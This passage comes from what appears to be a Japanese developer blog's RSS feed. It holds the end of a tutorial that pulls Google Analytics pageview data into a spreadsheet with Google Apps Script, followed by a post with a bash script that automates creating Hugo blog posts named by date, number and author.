&lt;span class="nx">getGoogleAnalytics&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;day&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">setYear&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">getGoogleAnalytics&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;year&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>まずがGASとアナリティクスの連携ができました。&lt;br>
次回はこのデータを使ってHugoとアナリティクスを連携して、人気記事を表示できるようにしたいと思います。&lt;/p>
&lt;p>ここまでの全プログラムは下記になります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="kd">function&lt;/span> &lt;span class="nx">getDate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kd">let&lt;/span> &lt;span class="nx">calc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;d&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">switch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s2">&amp;#34;month&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">calc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;M&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s2">&amp;#34;year&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">calc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;y&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">calc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;d&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">d1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">dayjs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">dayjs&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nx">locale&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;ja&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nx">start&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">d1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">subtract&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">calc&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;YYYY-MM-DD&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nx">end&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">d1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;YYYY-MM-DD&amp;#39;&lt;/span>&lt;span class="p">)};&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">getGoogleAnalytics&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;ga:[GAビューID]&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">date&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">getDate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">AnalyticsReporting&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Reports&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">batchGet&lt;/span>&lt;span class="p">({&lt;/span>
&lt;span class="nx">reportRequests&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[{&lt;/span>
&lt;span class="nx">viewId&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">id&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">dateRanges&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[{&lt;/span>&lt;span class="nx">startDate&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="nx">date&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">start&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">endDate&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">date&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">end&lt;/span>&lt;span class="p">}],&lt;/span>
&lt;span class="nx">samplingLevel&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;LARGE&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">metrics&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[&lt;/span>
&lt;span class="p">{&lt;/span>&lt;span class="nx">expression&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;ga:pageviews&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span>
&lt;span class="p">{&lt;/span>&lt;span class="nx">expression&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;ga:sessions&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span>
&lt;span class="p">{&lt;/span>&lt;span class="nx">expression&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;ga:users&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span>
&lt;span class="p">],&lt;/span>
&lt;span class="nx">dimensions&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[&lt;/span>
&lt;span class="p">{&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;ga:pagePath&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="p">],&lt;/span>
&lt;span class="nx">orderBys&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[{&lt;/span>
&lt;span class="nx">fieldName&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;ga:pageviews&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">sortOrder&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;DESCENDING&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">}],&lt;/span>
&lt;span class="p">}]&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="kd">let&lt;/span> &lt;span class="nx">rows&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">JSON&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">parse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">response&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">reports&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">rows&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">rows&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">rows&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">filter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">posts&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">test&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">dimensions&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">])).&lt;/span>&lt;span class="nx">map&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">f&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">dimensions&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">metrics&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nx">values&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="kd">let&lt;/span> &lt;span class="nx">sheet&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">SpreadsheetApp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getActive&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nx">getSheetByName&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">sheet&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">clear&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">rows&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">unshift&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s2">&amp;#34;link&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;pv&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;session&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;users&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="nx">sheet&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getRange&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">rows&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">rows&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nx">length&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">setValues&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">rows&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">setMonth&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">getGoogleAnalytics&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;month&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">setDay&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">getGoogleAnalytics&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;day&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">setYear&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">getGoogleAnalytics&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;year&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/1%E9%80%B1%E9%96%93%E3%81%A7Google%E3%82%A2%E3%83%8A%E3%83%AA%E3%83%86%E3%82%A3%E3%82%AF%E3%82%B94%E3%81%AE%E5%9F%BA%E7%A4%8E%E3%81%8C%E5%AD%A6%E3%81%B9%E3%82%8B%E6%9C%AC-1%E9%80%B1%E9%96%93%E3%81%A7%E5%9F%BA%E7%A4%8E%E3%81%8C%E5%AD%A6%E3%81%B9%E3%82%8B%E3%82%B7%E3%83%AA%E3%83%BC%E3%82%BA-%E7%AA%AA%E7%94%B0-%E6%9C%9B/dp/429501172X?_encoding=UTF8&amp;amp;qid=1641513597&amp;amp;sr=8-1&amp;amp;linkCode=li2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=1ee510fa1a17d9dbf251af13ddde94c3&amp;amp;language=ja_JP&amp;amp;ref_=as_li_ss_il" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//m.media-amazon.com/images/I/51bQyK5wvGL._SL160_.jpg" alt="1週間でGoogleアナリティクス4の基礎が学べる本 (1週間で基礎が学べるシリーズ)">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">1週間でGoogleアナリティクス4の基礎が学べる本 (1週間で基礎が学べるシリーズ)&lt;/h2>
&lt;p>大幅に改訂されたWebマーケティングツール「Googleアナリティクス4」の基礎と活用法を最前線のWebマーケッターたちがやさしく解説!
本書は、WebマーケターのためにGoogleアナリティクス4（GA4・ジーエーフォー）の基礎知識を解説した入門書です。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/Google-Apps-Script%E5%AE%8C%E5%85%A8%E5%85%A5%E9%96%80-Google%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%A8Google-Workspace%E3%81%AE%E6%9C%80%E6%96%B0%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%9F%E3%83%B3%E3%82%B0%E3%82%AC%E3%82%A4%E3%83%89/dp/4798063339?_encoding=UTF8&amp;amp;qid=1641513615&amp;amp;sr=8-8&amp;amp;linkCode=li3&amp;amp;tag=nlpqueens-22&amp;amp;linkId=e2278a36e1a2780b57906fc14ef78eb4&amp;amp;language=ja_JP&amp;amp;ref_=as_li_ss_il" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//m.media-amazon.com/images/I/51ZGWOZiUNL._SL250_.jpg" alt="詳解! Google Apps Script完全入門[第2版] ~GoogleアプリケーションとGoogle Workspaceの最新プログラミングガイド">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解! Google Apps Script完全入門[第2版] ~GoogleアプリケーションとGoogle Workspaceの最新プログラミングガイド&lt;/h2>
&lt;p>今や私たちの仕事や生活に無くてはならない存在になったGoogleサービス。これらGoogleサービスの自動化や連携を行うことで、大幅な効率化が図れます。そして、それを可能にするのがGoogle Apps Script(GAS)です。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>シェルスクリプトをつかって、hugoで楽ちんにファイルを作成して編集できないかっていうはなし</title><link>https://suzukiiichiro.github.io/posts/2022-01-06-01-suzuki/</link><pubDate>Thu, 06 Jan 2022 14:21:51 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-06-01-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-06-01-suzuki/2021-12-23-bash.jpg" alt="Featured image of post シェルスクリプトをつかって、hugoで楽ちんにファイルを作成して編集できないかっていうはなし" />&lt;h2 id="はじめに">はじめに&lt;/h2>
&lt;p>ここでは、hugoコマンドでnewする時に指定するファイル名を、シェルスクリプトを使ってなるべく簡便にあてはめてファイル生成しようというものです。&lt;/p>
&lt;p>hugo コマンドでgithub.ioディレクトリに記事を投稿する場合、以下のコマンドをたたくと思います。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">$ hugo new posts/＜ディレクトリ＞/index.md
&lt;/code>&lt;/pre>&lt;/div>&lt;p>または&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">$ hugo new posts/＜今日の日付＞.md
&lt;/code>&lt;/pre>&lt;/div>&lt;p>面倒なんですよね。。。&lt;/p>
&lt;h2 id="ディレクトリの指定">ディレクトリの指定&lt;/h2>
&lt;p>通常、記事毎にディレクトリを分けて、アクセスされるファイルをindex.mdにした場合は、以下の通りになりますよね。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">$ hugo new posts/＜今日の日付のディレクトリ＞/index.md
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ナンバリングの効用">ナンバリングの効用&lt;/h2>
&lt;p>ただ、同日に気分が乗ってきて、もう一つ記事を投稿しようとする場合は、日付の後ろに「-02」とか工夫する必要も出てきたりします。たとえば以下のように&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">$ hugo new posts/＜今日の日付のディレクトリ＞-＜ナンバリング02＞/index.md
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="複数メンバーの投稿を区別する">複数メンバーの投稿を区別する&lt;/h2>
&lt;p>複数のコラボレーターで投稿するgithub.ioの場合は、投稿者も区別したくなります。例えば&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">$ hugo new posts/＜今日の日付のディレクトリ＞-＜作成者＞-＜ナンバリング02＞/index.md
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ようするに、シェルスクリプトを使って、以下のコマンドを実行したい訳です。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">$ hugo new posts/2022-01-06-01-suzuki/index.md
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="起動パラメータ">起動パラメータ&lt;/h2>
&lt;p>と、なると、パラメータは以下の三つとなりますね。&lt;br>
$today 今日の日付&lt;br>
$number 記事のナンバリング&lt;br>
$author 作成者&lt;/p>
&lt;h2 id="実行イメージ">実行イメージ&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="c1"># 作成者 suzuki の 01 番目の投稿記事&lt;/span>
$ bash mkArticle.sh suzuki &lt;span class="m">01&lt;/span>
$ hugo new posts/&lt;span class="nv">$today&lt;/span>-&lt;span class="nv">$number&lt;/span>-&lt;span class="nv">$author&lt;/span>/index.md
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="気をつけるところは">気をつけるところは&lt;/h2>
&lt;h3 id="パラメータを省略したときの挙動">パラメータを省略したときの挙動&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">$ bash mkArticle.sh
&lt;/code>&lt;/pre>&lt;/div>&lt;p>実行した場合に、「作成者が指定されていないからやりなおしてね」というのもちょっと寂しいものがあります。指定していなければ、都度、聞いてきて欲しいものです。そこで readコマンドで作成者を尋ねてくる感じにします。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash"> &lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -z &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$author&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ユーザー名を半角で入力&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> author&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="同日ファイルの存在を確認">同日ファイルの存在を確認&lt;/h3>
&lt;p>２．すでに同日に一つ目の記事を投稿してある。要するに生成しようとしているファイルがすでに存在する場合の挙動です。こちらは、ファイルが存在していれば、１を応用して、別のナンバリングを指定するように尋ねてくれると良さそうです。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash"> &lt;span class="k">while&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nb">true&lt;/span> &lt;span class="o">]&lt;/span> &lt;span class="p">;&lt;/span>&lt;span class="k">do&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f &lt;span class="s2">&amp;#34;content/posts/&lt;/span>&lt;span class="nv">$today&lt;/span>&lt;span class="s2">-&lt;/span>&lt;span class="nv">$number&lt;/span>&lt;span class="s2">-&lt;/span>&lt;span class="nv">$author&lt;/span>&lt;span class="s2">/index.md&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$number&lt;/span>&lt;span class="s2"> ファイルが既に存在します。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;別のナンバリングを指定して下さい 02とか03とか&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> number&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
break&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ですので、ナンバリングの初期値は「01」としておいて、そのファイルが既に存在する場合は、あらためてユーザーにナンバリングを尋ねてくるという手法としました。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash"> &lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -z &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$number&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nv">number&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;01&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="実行方法">実行方法&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">$ bash mkArticle.sh suzuki 01&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">前述のとおり作成者、ナンバリングは省略可能です。
$ bash mkArticle.sh
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ソース全文">ソース全文&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:mkArticle.sh" data-lang="bash:mkArticle.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
: &lt;span class="s1">&amp;#39;使い方
&lt;/span>&lt;span class="s1">一つ目のパラメーターに作成者を指定します
&lt;/span>&lt;span class="s1">二つ目のパラメータにナンバリングを指定します
&lt;/span>&lt;span class="s1">一つ目 01(未指定の場合は01）
&lt;/span>&lt;span class="s1">二つ目 02
&lt;/span>&lt;span class="s1">
&lt;/span>&lt;span class="s1">（例)
&lt;/span>&lt;span class="s1">$ bash mkArticle.sh suzuki 01;
&lt;/span>&lt;span class="s1">
&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1">#作成者 無指定であれば入力を促す&lt;/span>
&lt;span class="nv">author&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">#今日の日付&lt;/span>
&lt;span class="nv">today&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>date &lt;span class="s2">&amp;#34;+%Y-%m-%d%n&amp;#34;&lt;/span>&lt;span class="k">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">#今日のインデクス 一つ目の投稿であれば01 二つ目の投稿であれば02&lt;/span>
&lt;span class="nv">number&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$2&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="k">function&lt;/span> getParam&lt;span class="o">(){&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -z &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$number&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nv">number&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;01&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -z &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$author&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ユーザー名を半角で入力&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> author&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nb">true&lt;/span> &lt;span class="o">]&lt;/span> &lt;span class="p">;&lt;/span>&lt;span class="k">do&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f &lt;span class="s2">&amp;#34;content/posts/&lt;/span>&lt;span class="nv">$today&lt;/span>&lt;span class="s2">-&lt;/span>&lt;span class="nv">$number&lt;/span>&lt;span class="s2">-&lt;/span>&lt;span class="nv">$author&lt;/span>&lt;span class="s2">/index.md&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$number&lt;/span>&lt;span class="s2"> ファイルが既に存在します。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;別のナンバリングを指定して下さい 02とか03とか&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> number&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
break&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="k">function&lt;/span> execHugo&lt;span class="o">(){&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;hugoコマンドを実行します&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;hugo new posts/&lt;/span>&lt;span class="nv">$today&lt;/span>&lt;span class="s2">-&lt;/span>&lt;span class="nv">$number&lt;/span>&lt;span class="s2">-&lt;/span>&lt;span class="nv">$author&lt;/span>&lt;span class="s2">/index.md&amp;#34;&lt;/span>
hugo new posts/&lt;span class="nv">$today&lt;/span>-&lt;span class="nv">$number&lt;/span>-&lt;span class="nv">$author&lt;/span>/index.md
&lt;span class="c1"># 処理終了&lt;/span>
